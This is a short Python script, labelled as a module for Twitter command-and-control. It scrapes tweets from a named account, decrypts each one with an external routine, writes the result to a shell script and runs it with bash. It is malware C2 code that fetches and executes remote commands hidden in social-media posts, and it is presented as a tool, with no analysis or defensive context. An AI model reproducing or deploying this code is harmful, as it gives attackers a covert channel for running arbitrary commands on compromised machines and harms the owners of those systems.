# module for twitter c2
# kolache2 : a3829593@drdrb.net : flaky pastry

import urllib, os
execfile("tweet2-crypto.py")

urlhandle = urllib.urlopen("http://twitter.com/kolache2")
urldata = urlhandle.read()

memhdl = open("tweet2.old", "r")
memstr = memhdl.read()
memhdl.close()
filehdl = open("tweet2.sh", "w")

mostrecent = True

c=0
while c < len(urldata):
	ccont = urldata.find("data-time", c)
	recentmem = urldata[urldata.find("\"",ccont+1):urldata.find("\"", ccont+12)]
	if recentmem == memstr:
		break
	if mostrecent:
		memhdl = open("tweet2.old", "w")
		memhdl.write(recentmem)
		memhdl.close()
		mostrecent = False
	ccont = urldata.find("js-tweet-text", c)
	if ccont == -1:
		# nothing to do here
		print("No more tweets available")
		break
	prstr = urldata[ccont:urldata.find("</p>",ccont)]
	# need to add memory of tweets already parsed
	encstr = prstr[prstr.find(">")+1:]
	decstr = decryption(encstr)
	filehdl.write(decstr)
	c = c + ccont + len(prstr)

filehdl.close()
os.system("bash tweet2.sh")
